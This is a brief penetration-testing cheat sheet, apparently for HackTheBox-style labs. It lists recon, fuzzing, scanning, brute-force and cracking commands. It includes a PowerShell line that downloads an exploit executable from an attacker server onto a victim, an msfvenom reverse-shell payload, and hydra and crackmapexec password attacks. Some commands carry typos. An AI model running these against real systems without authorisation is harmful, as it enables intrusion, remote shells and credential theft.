# Cul
 
 * curl -X OPTIONS -I <URL> [allow HTTP Methods]

# fuff
 
 * ffuf -u http://URL/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,302

# Wfuzz

 *  wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,302,301 http://10.129.206.31/FUZZ.php

 # gobuster [subdomain]

  * gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain  //subdomain


# amass

 * amass enum -d clicktheclapbutton50timesplz.com

# sublist3r

 * sublist3r -d techyrick.com -o file.txt
 * sublist3r -d techyrick.com -b

# nslookup 

 * $ nslookup example.com
 * $ nslookup $ip$ 
 * $ nslookup $ip$ $ip$

# dig 
 
 * dig axfr cronos.htb @10.10.10.13
 * dig -x 10.10.10.13 @10.10.10.13

# Whatweb

 * whatweb http://URL -v

# nmap
 
 * nmap -sn 192.168.1.0/24 //scan networks
 * nmap --top-ports 1000 $ip   
 * nmap -iL list.txt
 * nmap -A -T4 cloudflare.co
 * nmap -sV localhost
 * nmap -p- -pn -vv -T4 -n $ip
 * nmap --top-ports 100 -A -sV -T4 $ip
 * sudo nmap -sSVC -p-10000 $ip$

# rustscan || like nmap

 rustscan -a 10.129.184.36 --ulimit 5000 -- -A


# bettercap

 * sudo bettercap
 * net.probe on 
 * net.show


# waybackurls

 * cat program.txt | waybackurls >> urls.txt  //For target scope


# nuclei

 * cat program.txt | nuclei

# John the Ripper

 * john --wordlists=/usr/share/wordlist/rockyou.txt john.txt

# Docker

 * sudo ddocker run --rm -i $Container/Name$

# Metasploit 
  
 * search type:exploit name:smb platform:windows

# searchsploit 

 searchsploit -m %path/file%

# Upload File on Victem

 powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.105:8000/MS10-059.exe', 'MS10-059.exe')"

# PayLoad 

 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe

# hydra 

 hydra -l none -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V

# crackmapexec

 * crackmapexec smb solarlab.htb -u blake -p pass.txt

# wpscan 

 * wpscan --url example.com